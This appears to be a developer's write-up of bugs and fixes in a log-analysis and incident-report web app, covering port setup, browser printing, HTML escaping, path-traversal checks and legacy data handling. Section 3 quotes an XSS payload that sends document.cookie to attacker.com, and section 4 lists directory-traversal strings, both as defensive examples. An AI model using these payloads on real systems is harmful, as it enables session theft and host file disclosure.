# Challenges Encountered & Engineering Solutions

This document details the real technical challenges, configuration hurdles, and architectural bugs encountered during the 60-Day Claude AI Mastery Challenge and the capstone sprint, along with the concrete engineering solutions applied.

---

## 1. Local Port Collision & Environment Synchronization

### Problem
During local development, port 8000 was frequently occupied by background Windows services or zombie processes from previous debug runs. The FastAPI backend was reconfigured to bind to port 8010:
```powershell
uvicorn backend.app.main:app --host 127.0.0.1 --port 8010
```
However, the Vite frontend continued attempting to connect to `http://localhost:8000`, causing the header health badge to remain disconnected and API requests to fail.

### Root Cause
The Vite client relied on a hardcoded fallback URL in code rather than reading from a localized environment variable.

### Solution
- Isolated client configuration using `frontend/.env.local`:
  ```bash
  VITE_API_URL=http://localhost:8010
  ```
- Configured the API service layer (`api.ts`) to read `import.meta.env.VITE_API_URL` with a graceful fallback.
- Added `frontend/.env.local` to `.gitignore` to guarantee machine-specific port configurations never leak into source control.

---

## 2. Server-Side PDF Compilation (The WeasyPrint Pivot)

### Problem
The initial architecture planned to compile formal incident PDF reports on the FastAPI server using `WeasyPrint`. During installation on the Windows host, WeasyPrint failed due to missing native C-libraries (`cairo-2.dll`, `pango-1.0-0.dll`, `gobject-2.0-0.dll`). Installing custom GTK bundles proved brittle and posed major risks for future minimal Docker container builds.

### Root Cause
WeasyPrint relies heavily on native OS rendering engines that are not bundled with standard Python wheels.

### Solution
- Replaced WeasyPrint entirely with a **browser-native print architecture**.
- Implemented `window.print()` triggered from the React report viewer.
- Authored a dedicated `@media print` stylesheet in `ReportView.module.css`:
  - Stripped all navigation, sidebars, buttons, and background chrome.
  - Switched to high-contrast white background with dark slate typography.
  - Enforced `break-inside: avoid;` on finding cards and timeline tables to prevent awkward pagination splits across page breaks.
  - Specified standard `@page { size: A4 portrait; margin: 12mm; }`.
- Added a companion standalone HTML report export with inline styles and full offline functionality.
- **Outcome**: Zero native C-dependencies, zero platform installation hurdles, and crisp vector typography rendered directly by the browser.

---

## 3. Hostile Log Input & Stored Cross-Site Scripting (XSS)

### Problem
Linux system logs frequently capture malicious payloads injected by attackers during reconnaissance or exploit attempts, such as:
```text
sudo: attacker : TTY=pts/1 ; COMMAND=/bin/bash -c "<script>fetch('http://attacker.com/?c='+document.cookie)</script>"
```
When generating standalone HTML reports for offline review or legal archiving, rendering raw log snippets without proper sanitization would execute malicious JavaScript in the reviewing analyst's browser.

### Root Cause
Direct string interpolation of untrusted log messages into HTML templates.

### Solution
- Implemented strict HTML entity escaping (`escapeHtml()`) across all report generation routines in `reportGenerator.ts`:
  ```typescript
  function escapeHtml(text: string): string {
    return text
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }
  ```
- In the React frontend, ensured log lines are rendered exclusively through native text nodes inside `<pre>` and `<code>` blocks, completely avoiding `dangerouslySetInnerHTML`.
- Validated injection defenses with automated tests in `scripts/verify_reports.mjs`.

---

## 4. Directory Traversal in Sample Scenario Loading

### Problem
The backend provides an endpoint (`/api/v1/evidence/sample`) allowing analysts to load pre-packaged demonstration log scenarios from `sample-data/linux/`. If the filename parameter is unconstrained, an attacker could supply directory traversal sequences (e.g. `../../../../etc/passwd` or `..\..\..\Windows\win.ini`) to read sensitive host files.

### Root Cause
Naive string concatenation (`base_dir / filename`) without containment verification.

### Solution
- Utilized Python 3's `Path.is_relative_to()` to strictly verify that the resolved canonical path remains within the designated directory:
  ```python
  resolved_path = (self.sample_dir / sample_name).resolve()
  if not resolved_path.is_relative_to(self.sample_dir):
      raise SampleNotFoundError("Invalid sample scenario path traversal attempt.")
  ```
- Enforced extension whitelisting requiring sample files to end in `.log`.
- Added unit tests specifically attempting traversal patterns to verify HTTP 400/404 rejection.

---

## 5. Dashboard Metric Desynchronization

### Problem
On Day 8, the workspace Dashboard displayed static hardcoded placeholder metrics (e.g. "4 active cases", "12 critical alerts") even when an analyst had saved real cases in `localStorage`.

### Root Cause
The Dashboard page was originally prototyped with mock data and was not wired to the client storage service.

### Solution
- Connected `Dashboard.tsx` to `getSavedCases()` from `caseStorage.ts`.
- Implemented real-time dynamic computation:
  - Active cases = total records in `localStorage`.
  - High-severity incidents = cases with `SUSPICIOUS_ACTIVITY_DETECTED`.
  - Backend status = active React Query ping to `/health`.

---

## 6. Backward Compatibility for Legacy Case Data

### Problem
On Day 8, the case data model was expanded to include a full `timeline?: TimelineEvent[]` array to enable chronological tables in incident reports. Previously saved Day 7 cases lacked this field, causing property access errors when attempting to view reports of legacy cases.

### Root Cause
Schema evolution without migration or backward-compatibility handling.

### Solution
- Designed a defensive report generator that checks for the presence of `caseRecord.timeline`.
- If missing, the report renders a clean informational banner:
  > *"Note: Chronological timeline telemetry was not preserved with this legacy case record. All cited evidence IDs and line numbers remain fully visible in the findings section below."*
- Verified legacy compatibility with automated regression tests in `scripts/verify_reports.mjs`.
